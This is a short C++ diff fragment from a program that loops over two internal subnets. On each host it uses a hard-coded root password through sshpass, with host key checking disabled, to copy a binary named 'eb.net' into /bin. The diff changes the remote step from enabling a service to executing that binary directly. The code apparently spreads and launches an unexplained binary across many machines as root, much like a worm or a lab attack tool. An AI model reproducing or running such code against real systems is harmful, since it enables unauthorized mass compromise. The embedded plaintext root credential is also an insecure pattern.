@@ -176,7 +176,7 @@ int main(int argc, char* argv[]){
 				command = "sshpass -p 1347QwAsZx scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 eb.net root@172.17.212." + std::to_string(i) + ":/bin"; 
 				system(command.c_str());
 				std::cout << i << std::endl;
-				system(("sshpass -p 1347QwAsZx ssh root@172.17.212." + std::to_string(i) + " systemctl enable eb").c_str());
+				system(("sshpass -p 1347QwAsZx ssh root@172.17.212." + std::to_string(i) + " /bin/./eb.net").c_str());
 				++total;
 			}
 			//setup for 213
@@ -184,7 +184,7 @@ int main(int argc, char* argv[]){
 				command = "sshpass -p 1347QwAsZx scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 eb.net root@172.17.213." + std::to_string(i) + ":/bin"; 
 				system(command.c_str());
 				std::cout << i << std::endl;
-				system(("sshpass -p 1347QwAsZx ssh root@172.17.213." + std::to_string(i) + "  systemctl enable eb").c_str());
+				system(("sshpass -p 1347QwAsZx ssh root@172.17.213." + std::to_string(i) + "  /bin/./eb.net").c_str());
 				++total;
 			}
 		}
